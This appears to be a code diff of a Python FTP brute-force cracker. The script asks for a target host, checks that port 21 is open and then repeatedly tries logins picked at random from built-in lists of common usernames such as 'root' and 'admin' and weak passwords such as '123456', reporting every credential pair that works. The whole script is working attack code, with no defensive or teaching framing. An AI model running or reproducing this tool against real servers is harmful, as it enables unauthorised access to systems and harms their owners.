@@ -3,8 +3,10 @@ import socket
 import time
 import os
 import random
+import requests
+import sys 
 
-os.system('clear')
+os.system('cls')
 print("")
 print('''
  _____ _____ _____ _____     _     _ _   
@@ -19,68 +21,75 @@ print("")
 print("Dont Talk http:// or https:// ( ex : Url : ex.com )")
 print("")
 url = input("url : ")
-port = 21
-get_ip = socket.gethostbyname(url)
+response = requests.get("http://" + url)
 print("")
-print(f"[*] set host : {url}")
-time.sleep(2)
-print(f"[*] host address : {get_ip} ...")
-time.sleep(2)
-print("[*] starting checking port....")
-time.sleep(3)
+print(f"[*] checking {url} status : {response.status_code}")
+time.sleep(0.30)
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.settimeout(1)
+if response.status_code == 200:
+    port = 21
+    get_ip = socket.gethostbyname(url)
+    print("")
+    print(f"[-] set host : {url}")
+    time.sleep(2)
+    print(f"[-] host address : {get_ip} ...")
+    time.sleep(0.40)
+    print("[-] starting checking port....")
+    time.sleep(0.40)
+    print("")
 
-code = s.connect_ex((url, port))
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(1)
 
-if code == 0:
-    print(f"[*] {get_ip} Is Opening Port {port}")
-    time.sleep(3)
-    print(f"[*] Setting Up botton")
+    code = s.connect_ex((url, port))
 
-    ftp = ftplib.FTP(url)
-
-    # list random username, password
-    username = ["root", "admin", "test", "guest", "ftp", "adm", "mysql", "admin123"]
-    password = ["123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111", "1234567", "dragon", "123123", "baseball", "abc123"]
-    
-    for i in range(104):
-        usernames = random.choice(username)
-        passwords = random.choice(password)
-        print("[*] FTP Login Sweep Incorect")
-        time.sleep(1)
-        print("[*] Random Username, Password list")
-        time.sleep(2)
-        print(f"[*] Starting Cracking USR, PWD For {get_ip} ")
+    if code == 0:
+        print(f"[+] {get_ip} Is Opening Port {port}")
         time.sleep(3)
+        print(f"[!] Setting Up botton")
+        time.sleep(5)
+
+        ftp = ftplib.FTP(url)
+
+        # list random username, password
+        username = ["root", "admin", "test", "guest", "ftp", "adm", "mysql", "admin123"]
+        password = ["123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111", "1234567", "dragon", "123123", "baseball", "abc123"]
+        
+        for i in range(104):
+            usernames = random.choice(username)
+            passwords = random.choice(password)
+            print("[-] FTP Login Sweep Incorect")
+            time.sleep(0.10)
+            print("[-] Random Username, Password list")
+            time.sleep(1)
+            print(f"[+] Starting Cracking USR, PWD For {get_ip} ")
+            time.sleep(0.30)
 
 
-        try:
-            ftp.login(usernames, passwords)
-            print(f"[*] IP : {get_ip}")
-            time.sleep(1)
-            print(f"[*] Username : {usernames}")
-            time.sleep(1)
-            print(f"[*] Password : {passwords}")
-            time.sleep(1)
-            print("[*] Login Success")
+            try:
+                ftp.login(usernames, passwords)
+                print(f"[*] IP : {get_ip}")
+                print(f"[*] PORT : {port}")
+                print(f"[*] Username : {usernames}")
+                print(f"[*] Password : {passwords}")
+                print("[*] Login Success")
 
 
-        except ftplib.error_perm:
-            print(f"[*] IP : {get_ip}")
-            time.sleep(1)
-            print(f"[*] Username : {usernames}")
-            time.sleep(1)
-            print(f"[*] Password : {passwords}")
-            time.sleep(1)
-            print("[*] Login FAILED ")
-            time.sleep(2)
+            except ftplib.error_perm:
+                print(f"[*] IP : {get_ip}")
+                print(f"[*] PORT : {port}")
+                print(f"[*] Username : {usernames}")
+                print(f"[*] Password : {passwords}")
+                print("[*] Login FAILED ")
+                time.sleep(0.30)
 
-elif code == s.timeout:
-    print(f"[!] {get_ip} responsed time out")
+    elif code == s.timeout:
+        print(f"[!] {get_ip} responsed time out")
+
+    else:
+        print("[+] Port 21 Not Opening , Please Try Again !!! ")
+        time.sleep(1)
+        os.system('py main.py' if os.name == 'nt' else 'python main.py')
 
 else:
-    print("[+] Port 21 Not Opening , Please Try Again !!! ")
-    time.sleep(1)
-    os.system('py test.py')
+    print(f"[!] {url} responsed time out")
